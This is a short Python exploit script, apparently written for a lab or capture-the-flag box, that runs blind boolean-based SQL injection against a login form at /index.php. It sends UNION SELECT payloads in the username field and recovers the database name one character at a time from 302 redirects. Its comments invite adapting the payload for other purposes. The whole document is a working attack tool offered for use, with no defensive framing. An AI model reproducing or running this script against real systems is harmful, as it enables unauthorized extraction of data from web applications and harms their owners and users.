import sys
import requests

def sqli(ip):
    symbols = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-/:$^ '
    tmp = ""

    while True:
        for i in symbols:
            post= {"username":f"' UNION SELECT 1,2,3,4 WHERE database() LIKE BINARY '{tmp+i}%' -- -","password":"doesntmatter"} #u can change this for other prposes
            req = requests.post(f"http://{ip}/index.php", data=post,allow_redirects=False) #address can also be chnaged 
            status_code=req.status_code
            print(f"{i}", end='\r')
            if status_code == 302:
                tmp += i
                print(tmp)
                break
            elif i == " " :
                print("\n[#] Attack compleated B)")
                print(f"DB_NAME: {tmp}")
                exit()


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <ip>" % sys.argv[0])
        print("(+) Example: %s 192.168.0.1" % sys.argv[0])
        return
    url = sys.argv[1]
    print("(+) Retrieving database..")
    sqli(url)

if __name__ == "__main__":
    main()
